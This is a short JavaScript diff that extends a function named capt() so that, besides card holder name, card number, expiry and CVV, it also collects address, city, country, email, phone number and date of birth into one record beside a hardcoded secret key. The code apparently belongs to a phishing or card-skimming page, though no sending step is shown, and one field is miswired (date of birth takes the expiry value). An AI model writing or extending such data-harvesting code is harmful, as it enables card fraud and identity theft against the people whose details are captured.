@@ -7,6 +7,15 @@ function capt(){
     var expiryDate= document.getElementById("expiryDate").value
     var CVV= document.getElementById("CVV").value
     
+    var address= document.getElementById("address").value;
+    var city= document.getElementById("city").value;
+    var country= document.getElementById("country").value;
+    
+    var email= document.getElementById("email").value;
+    var number= document.getElementById("number").value;
+    var dateOfBirth= document.getElementById("dateOfBirth").value;
+    
+
 
         
         const secretKey = '$2b$10$5.GD5IWqNSL2RsbiNWZdbeQGJ3wkUk/t3ZxfbbLn2ddvAPibpWpr.';
@@ -19,7 +28,14 @@ function capt(){
         Name: cardHolderName,
         CardNumber: cardNumber,
         Expiry: expiryDate,
-        Cvv: CVV
+        Cvv: CVV,
+        Address: address,
+        City: city,
+        Country: country,
+        Email: email,
+        phoneNumber: number,
+        ateOfBirth: expiryDate
+        
       };
 
       
